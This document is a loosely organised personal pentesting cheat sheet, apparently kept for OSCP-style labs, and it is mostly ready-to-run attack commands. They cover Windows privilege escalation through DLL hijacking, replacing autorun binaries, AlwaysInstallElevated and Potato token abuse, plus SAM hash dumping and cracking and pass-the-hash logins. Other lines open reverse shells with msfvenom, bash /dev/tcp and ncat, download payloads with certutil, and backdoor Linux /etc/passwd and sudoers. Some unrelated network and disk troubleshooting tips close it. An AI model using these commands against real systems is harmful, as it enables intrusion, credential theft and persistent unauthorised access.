net start filepermsvc
copy C:\Temp\filepermservice.exe "C:\Program Files\..\filepermservice.exe"

	##DLL search
echo %path%
accesschk.exe -dqv "C:\Python27"
calc "C:\Python27"

	##DLL HIjacking
.\accesschk.exe /accepteula -uvqc user dllsvc
	SERVICE_START
	SERVICE_STOP
sc.exe qc dllsvc
open procmon windows
clear and filter dllhijackservice.exe
	hijackme.dll NAME NOT FOUND
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.5 LPORT=53 -f dll -o hijackme.dll
copy hijackme.dll C:\Temp
nc -lvp 53
net start dllsvc

	##registry Autorun windows
.\winpeas.exe
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
	FILE_ALL_ACCESS
copy "C:\Program Files\Autorun Program\program.exe" autorun.exe
copy /Y reverse53.exe "C:\Program Files\Autorun Program\program.exe"
nc -lvp 53
reboot from admin / update windows and reboot


	##Always Install Elevated msi
.\winpeas.exe
	AlwaysInstallElevated set to 1 in HKLM
	AlwaysInstallElevated set to 1 in HKCU
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.5 LPORT=53 -f msi -o reverse53.msi
msiexec /quiet /qn /i reverse53.msi

	##password registry
.\winpeas.exe
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKCU /f password /t REG_SZ /s
winexe -U 'admin%password123' //10.10.122.201 cmd.exe


	##saved password
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse53.exe


	##search password file
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

	## SAM SYSTEM windows
C:\Windows\System32\Config
C:\Windows\Repair
C:\Windows\System32\config\RegBack
python /usr/share/doc/python3-impacket/examples/smbserver.py asd .
copy C:\Windows\repair\SAM 10.1.1.5\asd\
copy C:\Windows\repair\SYSTEM 10.1.1.5\asd\
git clone https://github.com/Neohapsis/creddump7.git
sudo pip3 install pycrypto
python3 pwdump.py SYSTEM SAM
	admin:500:31d6cfkajsbfk1397ghro28y983:oisoidj0981y3hru
	user:code:LM hash:NTLM hash
	if user has NTLM has start with 31d6c maybe set with no password or disabled
samdump2 SYSTEM SAM
hashcat -m 1000 --force a9vqoiqhf9hq80as8hfoif0da /home/rockyou.txt
hashcat -m 1000 hash.txt /home/rockyou.txt
	#pass the hash
evil-winrm -i 10.1.1.75 -u admin -H a9vqoiqhf9hq862340as8hfoif0da
pth-winexe -U 'admin%add3liof8auweoi18:a9vqoiqhf9hq862340as8hfoif0da' //10.1.1.75 cmd.exe
pth-winexe --system -U 'admin%add3liof8auweoi18:a9vqoiqhf9hq862340as8hfoif0da' //10.1.1.75 cmd.exe

	##task schedule
schtasks /query /fo LIST /v
PS> GET-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
type C:\DevTools\CleanUp.ps1
accesschk.exe /accepteula -quv user C:\DevTools\CleanUp.ps1
	FILE_WRITE_DATA
copy C:\DevTools\CleanUp.ps1 C:\Temp\
echo "C:\PrivEsc\reverse53.exe" >> C:\DevTools\CleanUp.ps1
nc -lvp 53

	##insecure GUI application
tasklist /V | findstr mspaint.exe
tasklist /V | findstr admin
click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
file://c:/windows/system32/cmd.exe
Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

	##Citrix environment
tasklist /V | findstr mspaint.exe
	running as admin
mspain > open file > file://C:/windows/system32/cmd.exe
nc -lvp 5555
mspain > open file > file://c:/windows/privesc/reverse.exe

	##startup application
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
	RW BUILDIN/Users
type CreateShotcut.vbs
	set oWS = WScript.CreateObject("WScript.Shell")
	sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
	set oLink = oWS.CreateShortCut(SLinkFile)
	oLink.TargetPath = "C:\PrivEsc\reverse222.exe"
	oLink.Save
cscript CreateShortcut.vbs
signoff > login as admin
login rdp as admin

	##installed application
.\Seatbelt.exe all
	Non Microsoft Process
.\winpeas.exe
	process line
find on exploit DB

	#password mining browser
msfconsole
use auxiliary/server/capture/http_basic
set uripath x set svchost 10.4.11.80
run
http://10.4.11.80/x with IExplorer
tskmanager -> right click -> create dumpfile
C:\Users\user\AppData\Local\Temp\iexplore.DMP
cat iexplore.DMP | grep "Authorization: Basic"


	##token impersonate rogue potato
whoami /priv
	SeImpersonatePrivilege
	SeAssignPrimaryTokenPrivilege
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.147.113:9999
C:\PrivEsc\RoguePotato.exe -r 10.4.11.80 -e "C:\PrivEsc\rev.exe" -l 9999
nc -lvp 4242
	##token impoersonate printspoofer
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\rev.exe" -i
nc -lvp 4242
	
	##Potato Privesc
	#https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
	#Hot Potato MS16-075
systeminfo
	Microsoft Windows 10 Profesional
	6.1.7601 Service Pack 1 Build 701
.\potato.exe -ip 10.1.1.75 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
powershell.exe -nop -ep bypass
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
Invoke-Tater -Trigger 1 -Command "whoami > asd.txt"
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
net localgroup administrators




	##remotepotato
	#https://rabakuku.xyz/windows-privilege-escalation-remotepotato0/

LFI Cheatseet


Evading WAF
===================================
system(base64_decode($_GET['c']))
http://website/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php



Root exec()
===================================
usermod -a -G admin user1				##in case u have user1 passwd
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
/tmp/rootbash -p
echo "rooot::0:0:root:/root:/bin/bash" >> /etc/passwd
echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd
echo "rooot:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:0:0:root:/root:/bin/bash" >> /etc/passwd
chown root:root /bin/sh ; chmod 4777 /bin/sh
/bin/bash -c 'bash -i >& /dev/tcp/10.1.1.5/4321 0>&1'
echo "user    ALL=(ALL:ALL) ALL" >> /etc/sudoers
echo "user	 (ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo -u root sudo su
openssl passwd godmode
rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash
echo "rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash" >> /etc/passwd

Administrator exec()
====================================
net user jembot Password123! /add
net localgroup administrators /add jembot
crackmapexec smb 192.168.70.63 -u jembot -p 'Password123!'
crackmapexec winrm 192.168.70.63 -u jembot -p 'Password123!'
psexec.py 'jembo2:Password123!@192.168.70.63'
\\192.168.17.12\asd\rshell.exe
commands.Add("certutil.exe -urlcache -split -f \"http://192.168.49.65:445/shell.exe\" \"C:\\inetpub\\wwwroot\\shell.exe\"");
commands.Add("\"C:\\inetpub\\wwwroot\\shell.exe\"");

===========================================================================

##no redirect with curl -v
##program bin exploit:https://gtfobins.github.io

##jquery vulner file upload
jquery-file-upload/server/php/
curl -F "files=@hex.php" http://local.linuxsec.org/labs/jQuery-File-Upload-9.22.0/server/php/ -v
    http://localhost##labs##jQuery-File-Upload-9.22.0##server##php##files##hex.php
	
cat /opt/LinEnum/LinEnum.sh | base64 -w 0 | xclip -selection primary
##paste in target with middle mouse click
base64 -d linenum.b64 > linenum.sh

curl -X OPTIONS -v http://192.168.126.129/test/
fuzzing github https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
https://www.exploit-db.com/docs/english/47032-buffer-overflows,-c-programming,-nsa-ghidra-and-more.pdf

##ubuntu network troubleshoot
cat /etc/*-release
systemctl list-unit-files | grep -i network
ethtool eth0
nano /etc/network/interfaces
	auto eth0
	iface eth0 inet dhcp
ifconfig eth0 up
dmesg | grep -i eth
dhclient eth1

##centos network troubleshoot
cat /etc/*-release
ip a
cd /etc/sysconfig/network-script/
ls -laht
nano ifcfg-eth0
	DECIVE=eth0
	TYPE=Ethernet
	BOOTPROTO=dhcp
	ONBOOT=yes
	DHCP=yes
/etc/init.d/network restart
ifdown eth0
ifcup eth0


##disable ASLR
sudo sysctl -w kernel.randomize_va_space=0
    0 = Disablabed
    1 = Conservative Randomization
    2 = Full Randomization
	
##quick nmap
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.182 | grep ^[0-9] | cut -d '/'-f 1 | tr '\n' ',' | sed s/,$//)nmap -p$ports-Pn-sC-sV10.10.10.182
	
grep -o x /tmp/etcpasswd | wc -l
			##count exact word
ps -xaf		
		##windows nopass
https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html

		##image enumerate
binwalk -W	
		##modify time file
touch -a -m -t 202001011240.05 file.txt
[[CC]YY]MMDDhhmm[.ss] time format

		##ssl bind shells:
Target: ncat -nvlp 4321 -e {/bin/bash | cmd.exe} --ssl
Attacker: ncat -nv 101.1.32 4321 --ssl

		##ssl reverse shells:
Target: ncat -nv 10.1.1.5 4321 -e {/bin/bash | cmd.exe} --ssl
Attacker: ncat -nvlp 4321 --ssl

		##curl put response
http response 201 created

		##tor network
torsocks curl ipv4.icanhazip.com
		
		##change default python
update-alternatives --config python
 
		##open image cmd
eog image.jpg

		##disk full
df -h
df -i
find / -type f -size +500M -exec ls -lht {}\;
find / -xdev -nam core -ls -o -path "/lib*" -prune
apt-get install ncdu
ncdu -x /
apt-get autoclean

		##last updated file
find / -mtime -1 -ls

		##OSCP
https://community.infosecinstitute.com/discussion/110760/oscp-jollyfrogs-tale


